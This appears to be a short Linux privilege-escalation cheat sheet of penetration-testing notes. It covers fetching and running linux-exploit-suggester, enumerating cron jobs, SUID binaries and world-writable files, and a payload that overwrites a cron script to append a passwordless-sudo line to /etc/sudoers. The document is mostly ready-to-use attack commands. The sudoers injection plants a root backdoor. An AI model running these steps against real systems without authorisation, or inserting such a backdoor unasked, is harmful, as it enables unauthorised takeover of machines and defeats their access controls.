### Kernel
```bash
# LINUX KERNEL
## Linux-Exploit-Suggester Install
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh

chmod +x linux-exploit-suggester.sh

./linux-exploit-suggester.sh
```

### Cron Jobs
```bash
# CRON
crontab -l

find / -name <CRONJOB_SCRIPT>

printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>
```

### SETUID - SUDO privileges
```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -u=s -type f 2>/dev/null

sudo -l
```

### Writable files
```shell
find / -not -type l -perm -o+w
```